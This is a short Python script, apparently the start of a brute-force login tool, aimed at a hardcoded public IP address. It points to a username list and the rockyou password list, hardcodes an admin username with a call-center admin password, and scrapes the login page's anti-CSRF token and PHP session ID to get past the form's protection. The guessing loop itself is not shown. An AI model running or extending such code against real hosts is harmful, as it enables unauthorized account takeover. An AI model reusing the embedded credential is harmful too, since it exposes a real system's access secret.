import requests
import sys
import re
from bs4 import BeautifulSoup

target = 'https://54.251.17.75'
user_list = 'data/wordlist/username.txt'
pass_list = 'data/wordlist/rockyou.txt'
username = 'admin'
password = 'Callcenteradmin@123'

success = 'index.php'

def csrf_token():
    try:
        # Make the request to the URL
        print ("\n[i] URL: %s/login.php" % target)
        r = requests.get("{0}/login.php".format(target),verify=False, allow_redirects=False)
    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text, features="lxml")
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print ("[i] user_token: %s" % user_token)

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s\n" % session_id)

    return session_id, user_token

print(csrf_token())